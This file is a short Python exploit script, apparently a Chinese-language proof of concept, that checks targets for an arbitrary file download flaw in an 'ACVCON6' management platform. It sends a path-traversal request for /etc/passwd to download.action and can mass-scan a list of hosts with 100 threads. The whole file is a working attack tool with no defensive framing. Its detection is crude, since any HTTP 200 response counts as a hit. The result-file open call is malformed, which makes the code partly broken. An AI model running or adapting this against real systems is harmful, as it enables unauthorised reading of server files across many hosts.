import argparse
import requests
import os
import sys
import json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()



def banner():
    test = '''
      _                     _                 _             _   _             
     | |                   | |               | |           | | (_)            
   __| | _____      ___ __ | | ___   __ _  __| |  __ _  ___| |_ _  ___  _ __  
  / _` |/ _ \ \ /\ / / '_ \| |/ _ \ / _` |/ _` | / _` |/ __| __| |/ _ \| '_ \ 
 | (_| | (_) \ V  V /| | | | | (_) | (_| | (_| || (_| | (__| |_| | (_) | | | |
  \__,_|\___/ \_/\_/ |_| |_|_|\___/ \__,_|\__,_(_)__,_|\___|\__|_|\___/|_| |_|                                                                                                                                                     
                                               author:sanhua
                                               ate:2024-09-13
                                               version:1.0
    '''
    print(test)


def poc(target):
    payload = "/download.action?filename=../../../../../../etc/passwd"
    url = target + payload
    response = requests.get(url, verify=False,timeout=10)
    try:
        if response.status_code == 200:
            print(f"[+] {target} 存在任意文件下载漏洞")
            with open("result.txt,w,encoding='utf-8") as f:
                f.write(f"{target}+存在任意文件下载漏洞")
        else:
            print(f"[-] {target} 不存在任意文件下载漏洞")
    except Exception as e:
        print(f"[!] {target} 连接超时或其他错误: {e}")


def main():
    banner()
    url_list = []
    parse = argparse.ArgumentParser(description="")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        if not os.path.exists(args.file):
            print(f"[!] {args.file} 文件不存在，请检查路径")
            return
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                if url:  # 确保不添加空行
                    url_list.append(url)
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t ACVCON6 系统管理平台 download.action 任意文件下载漏洞.py -h")


if __name__ == '__main__':
    main()